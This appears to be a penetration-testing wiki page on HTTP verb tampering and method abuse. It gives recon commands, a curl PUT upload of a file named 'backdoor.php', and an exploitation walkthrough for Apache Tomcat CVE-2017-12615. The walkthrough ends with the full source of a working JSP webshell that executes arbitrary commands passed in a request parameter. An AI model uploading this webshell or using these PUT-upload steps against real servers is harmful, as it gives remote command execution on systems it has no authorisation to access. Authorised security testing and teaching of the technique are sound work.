# HTTP methods

## Theory

### Verb tampering

Some websites filter access to resources but fail at filtering out all HTTP methods. When an attacker tries to access a resource with different methods (GET, POST, HEAD, etc.) to bypass the access control, this is called HTTP verb tampering.

### Methods abuse

Some HTTP methods can be used for malicious purposes: `PUT`, `DELETE`, etc. The HTTP methods abuse is not aimed at gaining access to a specific page like verb tampering but more like what methods are accepted by the server and how can an attacker profit from those.

## Practice

### Recon

Testing for HTTP verb tampering and method abuse can be done with [httpmethods](https://github.com/ShutdownRepo/httpmethods).

```bash
httpmethods -u "https://target.url/"
httpmethods -u "https://target.url/restricted_page"
```

A manual HTTP request with the `OPTIONS` method can also be used to enumerate what methods are supported. This works if the `OPTIONS` methods is allowed in the first place.

```bash
curl --include --request OPTIONS "https://target.url/"
```

### Abusing the `PUT` method

The `PUT` method can be used to upload arbitrary files. Some directories have different rights, it can be useful to test the method on a wide range of directories.

```bash
curl --include --upload-file "backdoor.php" "https://target.url/"
```

### Apache Tomcat JSP PUT - CVE-2017-12615

Abusing the `PUT` method also applies to **CVE-2017-12615**: When running Apache Tomcat 7.0.0 to 7.0.79 on Windows with HTTP PUTs enabled (e.g. via setting the read-only initialization parameter of the Default to false) it was possible to upload a JSP file to the server via a specially crafted request. This JSP could then be requested and any code it contained would be executed by the server.

Exploitation of this vulnerability can be achieved manually by creating a `.jsp` file and by uploading it to the target server.

{% code title="test.jsp" %}
```java
<% out.write("<html><body><h3>JSP upload successfully</h3></body></html>"); %>
```
{% endcode %}

```bash
curl --include --upload-file "test.jsp" "https://target.url/"
```

If the upload is successful, the following JSP webshell ([source](https://github.com/tennc/webshell/blob/master/fuzzdb-webshell/jsp/cmd.jsp)) can then be uploaded to attempt at execute arbitrary commands on the remote server.

{% code title="webshell.jsp" %}
```java
<%@ page import="java.util.*,java.io.*"%>
<HTML><BODY>
<FORM METHOD="GET" NAME="myform" ACTION="">
<INPUT TYPE="text" NAME="cmd">
<INPUT TYPE="submit" VALUE="Send">
</FORM>
<pre>
<%
if (request.getParameter("cmd") != null) {
        out.println("Command: " + request.getParameter("cmd") + "<BR>");
        Process p = Runtime.getRuntime().exec(request.getParameter("cmd"));
        OutputStream os = p.getOutputStream();
        InputStream in = p.getInputStream();
        DataInputStream dis = new DataInputStream(in);
        String disr = dis.readLine();
        while ( disr != null ) {
                out.println(disr); 
                disr = dis.readLine(); 
                }
        }
%>
</pre>
</BODY></HTML>
```
{% endcode %}